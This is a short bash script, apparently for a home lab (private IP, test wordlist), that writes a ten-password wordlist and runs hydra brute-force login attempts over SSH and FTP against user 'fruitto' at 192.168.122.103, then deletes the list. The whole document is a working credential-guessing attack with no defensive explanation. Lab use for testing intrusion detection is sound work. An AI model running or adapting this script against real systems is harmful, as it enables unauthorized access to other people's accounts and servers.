#!/bin/bash

TARGET="192.168.122.103"
USERNAME="fruitto"
WORDLIST="wordlist_test.txt"

# สร้าง wordlist
cat <<EOF > $WORDLIST
123456
password
admin123
qwerty
root123
111111
letmein
wrongpass1
wrongpass2
wrongpass3
EOF

echo "[*] Start SSH brute force..."
hydra -l $USERNAME -P $WORDLIST $TARGET ssh -t 4 -V

echo "[*] Start FTP brute force..."
hydra -l $USERNAME -P $WORDLIST $TARGET ftp -t 4 -V

rm $WORDLIST